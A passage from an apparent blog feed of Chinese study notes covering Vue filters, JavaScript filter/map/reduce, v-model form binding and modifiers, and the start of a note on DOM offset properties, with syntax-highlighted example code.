class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">book</span>:[...],</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">getFinalPrice</span>(<span class="params">price</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="string">&#x27;￥&#x27;</span> + price.<span class="title function_">toFixed</span>(<span class="number">2</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;          </span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">filters</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">showPrice</span>(<span class="params">price</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="string">&#x27;￥&#x27;</span> + price.<span class="title function_">toFixed</span>(<span class="number">2</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;                </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">             </span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="8.-javascript高阶函数的使用（p45）">8. JavaScript高阶函数的使用（p45）<a title="#8.-javascript高阶函数的使用（p45）" href="#8.-javascript高阶函数的使用（p45）"></a></h2><h3 id="8.1-循环">8.1 循环<a title="#8.1-循环" href="#8.1-循环"></a></h3><ul><li>for循环</li><li>for-in</li><li>for-of</li></ul><h3 id="8.2filter/map/reduce">8.2filter/map/reduce<a title="#8.2filter/map/reduce" href="#8.2filter/map/reduce"></a></h3><ul><li><p>filter中的回调函数有一个要求：必须返回一个boolean值</p></li><li><p>true时：函数内部会自动将这次回调的n加入到新的数组中</p></li><li><p>false时：函数内部会过滤掉这次的n</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> nums = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">50</span>,<span class="number">111</span>,<span class="number">5555</span>,<span class="number">12</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//选出&lt;100的数 * 2 相加</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.filter 的使用</span></span><br><span class="line"><span class="keyword">let</span> newNums = nums.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> n&lt;<span class="number">100</span>;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newNums)</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.map的使用</span></span><br><span class="line"><span class="keyword">let</span> new2Nums = newNums.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> n*<span class="number">2</span>;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(new2Nums)</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.reduce的使用</span></span><br><span class="line"><span class="comment">//对数组的全部内容进行汇总 第二个参数是初始值</span></span><br><span class="line"><span class="keyword">let</span> total = new2Nums.<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">preValue,n</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> preValue + n;</span><br><span class="line">&#125;,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//全部汇总 --&gt; 函数式编程</span></span><br><span class="line"><span class="keyword">let</span> total = nums.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> n&lt;<span class="number">100</span>;</span><br><span class="line">&#125;).<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> n*<span class="number">2</span>;</span><br><span class="line">&#125;).<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">preValue,n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> preValue + n</span><br><span class="line">&#125;,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用简写</span></span><br><span class="line"><span class="keyword">let</span> total = nums.<span class="title function_">filter</span>(<span class="function"><span class="params">n</span> =&gt;</span> n&lt;<span class="number">100</span>).<span class="title function_">map</span>(<span class="function"><span class="params">n</span> =&gt;</span> n*<span class="number">2</span>).<span class="title function_">reduce</span>(<span class="function">(<span class="params">pre,n</span>) =&gt;</span> pre +n );</span><br></pre></td></tr></table></figure></li></ul><h2 id="9.表单绑定v-model(p46-51)">9.表单绑定v-model(p46-51)<a title="#9.表单绑定v-model(p46-51)" href="#9.表单绑定v-model(p46-51)"></a></h2><ul><li>Vue中使用v-model指令来实现表单元素和数据的双向绑定</li></ul><h3 id="9.1-v-model-原理">9.1 v-model 原理<a title="#9.1-v-model-原理" href="#9.1-v-model-原理"></a></h3><ul><li><p>v-model其实是一个语法糖，它的本质是包含两个操作：</p><ol><li>v-bind绑定value属性</li><li>v-on指令给当前元素绑定input事件</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 等于 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">v-bind:value</span>=<span class="string">&quot;message&quot;</span> <span class="attr">v-on:input</span>=<span class="string">&quot;message=$event.target.value&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 等于 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">:value</span>=<span class="string">&quot;message&quot;</span> @<span class="attr">input</span>=<span class="string">&quot;valueChange&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&quot;hello&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">valueChange</span>(<span class="params">event</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">message</span> = event.<span class="property">target</span>.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="9.2-v-model-结合radio类型">9.2 v-model 结合radio类型<a title="#9.2-v-model-结合radio类型" href="#9.2-v-model-结合radio类型"></a></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 因为使用了v-model所以可以不使用name --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&#x27;male&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;male&quot;</span> <span class="attr">value</span>=<span class="string">&quot;男&quot;</span> <span class="attr">v-model</span>=<span class="string">&#x27;sex&#x27;</span>&gt;</span>男</span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&#x27;female&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;female&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span> <span class="attr">v-model</span>=<span class="string">&#x27;sex&#x27;</span>&gt;</span>女</span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 因为vue里的sex有值 所以会有默认选上的 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>您选择的性别为：&#123;&#123; sex &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&quot;hello&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9.3-v-model-结合checkbox类型">9.3 v-model 结合checkbox类型<a title="#9.3-v-model-结合checkbox类型" href="#9.3-v-model-结合checkbox类型"></a></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 1.checkbox 单选框 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;agree&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;agree&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;isAgree&quot;</span>&gt;</span>同意协议</span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>您的选择是:&#123;&#123; isAgree &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">:disable</span>=<span class="string">&quot;!isAgree&quot;</span>&gt;</span>下一步<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 2.checkbox 多选框 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;篮球&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;bobbies&quot;</span>&gt;</span>篮球</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;足球&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;bobbies&quot;</span>&gt;</span>足球</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;兵乓球&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;bobbies&quot;</span>&gt;</span>兵乓球</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;羽毛球&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;bobbies&quot;</span>&gt;</span>羽毛球</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>您的爱好是：&#123;&#123; hobbies &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">isAgree</span>:<span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">hobbies</span>:[]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9.4-v-model结合select类型">9.4 v-model结合select类型<a title="#9.4-v-model结合select类型" href="#9.4-v-model结合select类型"></a></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;#app&#x27;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 1.选择一个 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;fruit&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;苹果&quot;</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;香蕉&quot;</span>&gt;</span>香蕉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;榴莲&quot;</span>&gt;</span>榴莲<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;葡萄&quot;</span>&gt;</span>葡萄<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>您选择的水果是：&#123;&#123;fruit&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 2.选择多个 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;fruits&quot;</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;苹果&quot;</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;香蕉&quot;</span>&gt;</span>香蕉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;榴莲&quot;</span>&gt;</span>榴莲<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;葡萄&quot;</span>&gt;</span>葡萄<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>您选择的水果是：&#123;&#123;fruit&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">friut</span>:<span class="string">&quot;香蕉&quot;</span>, <span class="comment">//所以香蕉会默认选上</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">fruits</span>:[]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9.5-值绑定">9.5 值绑定<a title="#9.5-值绑定" href="#9.5-值绑定"></a></h3><ul><li>与v-bind相似</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">v-for</span>=<span class="string">&quot;item in originHobbies&quot;</span> <span class="attr">:for</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">:value:</span>&quot;<span class="attr">item</span>&quot; <span class="attr">:id</span>=<span class="string">&quot;item&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span>&#123;&#123;item&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9.6-修饰符">9.6 修饰符<a title="#9.6-修饰符" href="#9.6-修饰符"></a></h3><h5 id=".lazy修饰符">.lazy修饰符<a title="#.lazy修饰符" href="#.lazy修饰符"></a></h5><ul><li><p>默认情况下，v-model默认是在input事件中同步输入框的数据的</p><blockquote><p>即一旦有数据改变 data中的数据就会自动发生改变</p></blockquote></li><li><p>lazy修饰符可以让数据在失去焦点或回车时才会更新</p></li></ul><h5 id=".number修饰符">.number修饰符<a title="#.number修饰符" href="#.number修饰符"></a></h5><ul><li>默认情况下，在输入框中输入的内容，都会被当作字符串类型进行处理</li><li>如果希望处理的是数字类型 type=”number“的，那么最好直接将内容当作数字处理</li><li>number修饰符可以让输入框中输入的内容自动转换成数字类型</li></ul><h5 id=".trim修饰符">.trim修饰符<a title="#.trim修饰符" href="#.trim修饰符"></a></h5><ul><li>如果输入的内容首尾有很多空格，通常希望将其去除</li><li>trim修饰符可以过滤内容左右两边的空格</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- lazy --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model.lazy</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- number --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">v-model.number</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- trim --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model.trim</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js webAPI--offset、client、scroll</title>
      <link href="/learningNotes/js/%E4%B8%89%E5%A4%A7%E7%B3%BB%E5%88%97"/>
      <url>/learningNotes/js/%E4%B8%89%E5%A4%A7%E7%B3%BB%E5%88%97</url>
      
        <content type="html"><![CDATA[<h3 id="1.元素偏移量offset系列">1.元素偏移量offset系列<a title="#1.元素偏移量offset系列" href="#1.元素偏移量offset系列"></a></h3><h4 id="1.1-offset概述">1.1 offset概述<a title="#1.1-offset概述" href="#1.1-offset概述"></a></h4><p>offset就是偏移量的意思，使用offset系列相关属性可以<font color='red'>动态</font>的得到该元素的位置（偏移）、大小等。</p><ul><li>获取元素距离<strong>带有定位</strong>的父元素的位置</li><li>获得元素自身的大小</li><li>返回的数值<strong>不带单位</strong></li></ul><p>offset 系列常用属性：</p><div class="φbq"><div class="φbs"><table><thead><tr><th>offset系列常用属性</th><th>作用</th><th style="padding:0"></th></tr></thead><tbody><tr><td>element.offsetParent</td><td>返回作为该元素<strong>带有定位</strong>的父级元素 if都无 则返回body</td><td></td></tr><tr><td>element.offsetTop</td><td>返回元素相对<strong>带有定位</strong>父元素上方的偏移</td><td></td></tr><tr><td>element.offsetLeft</td><td>返回元素相对<strong>带有定位</strong>父元素左边框的偏移</td><td></td></tr><tr><td>element.offsetWidth</td><td>返回自身包括padding、边框、内容区的宽度，不带单位</td><td></td></tr><tr><td>element.offsetHeight</td><td>返回自身包括padding、边框、内容区的高度，不带单位</td><td></td></tr></tbody></table></div></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.father</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: antiquewhite;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.son</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: brown;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;father&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;son&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> father = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.father&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> son = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.son&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//1.可以得到元素的偏移量</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(father.<span class="property">offsetTop</span>); <span class="comment">//150 if加上padding 150</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable 